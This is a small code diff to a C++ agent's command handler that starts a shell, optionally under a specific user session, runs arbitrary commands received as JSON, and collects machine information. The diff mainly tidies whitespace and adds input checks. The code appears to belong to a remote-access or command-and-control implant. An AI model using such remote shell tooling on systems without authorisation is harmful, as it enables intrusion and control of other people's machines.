@@ -13,7 +13,6 @@
 #include "utils/win32/include/UserUtils.hpp"
 #endif
 
-
 using namespace CppAgent;
 using rapidjson::Document;
 using rapidjson::Value;
@@ -34,7 +33,8 @@ std::string CommandHandler::handle(std::string_view reqJson)
     int cmdId{};
     if (!json::getInt(d, "action_id", cmdId) && !json::getInt(d, "action", cmdId))
         return makeError("Missing action_id");
-	DARKSCRY_LOG("CommandHandler: action_id = " + std::to_string(cmdId), Logger::Level::Debug);
+    
+    DARKSCRY_LOG("CommandHandler: action_id = " + std::to_string(cmdId), Logger::Level::Debug);
 
     auto it = registry_.find(cmdId);
     if (it == registry_.end())
@@ -76,6 +76,7 @@ std::string CommandHandler::onStartShell(const Document& req)
     }
 
     shellRunning_ = shell_->create_by_sid(sid);
+    if (shellRunning_) current_sid_ = sid;
 #else
     if (!shellRunning_)
         shellRunning_ = shell_->create();
@@ -90,7 +91,8 @@ std::string CommandHandler::onRunCommand(const Document& req)
         return makeError("Shell not running");
 
     std::string cmd;
-    json::getString(req, "command", cmd);
+    if (!json::getString(req, "command", cmd) || cmd.empty())
+        return makeError("Missing or empty command");
 
     std::string out = shell_->run_command(cmd);
     Document d; d.SetObject();
@@ -100,7 +102,7 @@ std::string CommandHandler::onRunCommand(const Document& req)
 
 std::string CommandHandler::onGetBasicMachineInfo(const Document&)
 {
-	auto info = sysinfo::get_basic_machine_info();
+    auto info = sysinfo::get_basic_machine_info();
 
     Document tmp; tmp.SetObject();
     tmp.AddMember("machine_info", serialization::toJson(info, tmp.GetAllocator()), tmp.GetAllocator());
